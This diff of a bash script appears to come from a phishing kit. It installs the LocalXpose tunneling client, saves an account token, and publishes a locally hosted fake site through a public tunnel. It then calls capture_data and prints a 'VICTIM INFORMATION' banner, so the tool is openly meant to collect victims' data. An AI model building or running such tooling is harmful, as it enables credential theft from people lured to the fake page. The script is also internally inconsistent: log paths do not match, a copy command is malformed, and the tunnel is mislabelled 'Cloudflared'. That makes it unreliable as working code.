@@ -1,5 +1,106 @@
-                  echo ""
-		      read -p $'\e[1;33m Please Enter Your ngrok authtoken without "./"\n\n\e[0m./ngrok authtoken ' auth
-                           if [[ ! ${auth} =~ ^([0-9a-zA-Z]*[_][0-9a-zA-Z])$ ]]; then
-			    
-			      echo ""
+download() {
+	url="$1"
+	output="$2"
+	file=`basename $url`
+	if [[ -e "$file" || -e "$output" ]]; then
+		rm -rf "$file" "$output"
+	fi
+	curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
+
+	if [[ -e "$file" ]]; then
+		if [[ ${file#*.} == "zip" ]]; then
+			unzip -qq $file > /dev/null 2>&1
+			cp -f $output > /dev/null 2>&1
+		elif [[ ${file#*.} == "tgz" ]]; then
+			tar -zxf $file > /dev/null 2>&1
+			cp -f $output > /dev/null 2>&1
+		else
+			cp -f $file > /dev/null 2>&1
+		fi
+		chmod +x $output $file > /dev/null 2>&1
+		rm -rf file1
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
+		{ reset_color; exit 1; }
+	fi
+}
+
+## Install LocalXpose
+install_localxpose() {
+	if [[ -e ".server/loclx" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+		else
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+		fi
+	fi
+}
+
+localxpose_auth() {
+	./loclx -help > /dev/null 2>&1 &
+	sleep 1
+	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
+
+	[ "$(./loclx account status | grep Error)" ] && {
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		sleep 3
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		[[ $loclx_token == "" ]] && {
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+		} || {
+			echo -n "$loclx_token" > $auth_f 2> /dev/null
+		}
+	}
+}
+
+## Start LocalXpose (Again...)
+start_loclx() {
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; localxpose_auth; }
+	echo -e "\n"
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 1 && termux-chroot ./loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t 127.0.0.1:4444 > /.loclx 2>&1 &
+	else
+		sleep 1 && ./loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t 127.0.0.1:4444 > /.loclx 2>&1 &
+	fi
+
+	sleep 12
+	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+	custom_url "$loclx_url"
+	capture_data
+}
+
+links() {
+                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+                           echo -e " "
+			   echo -e " "
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $loclx_url                                
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+                           echo ""
+}
+
+
+
+
+install_localxpose
+chmod +x loca*
+localxpose_auth
+start_loclx
+links
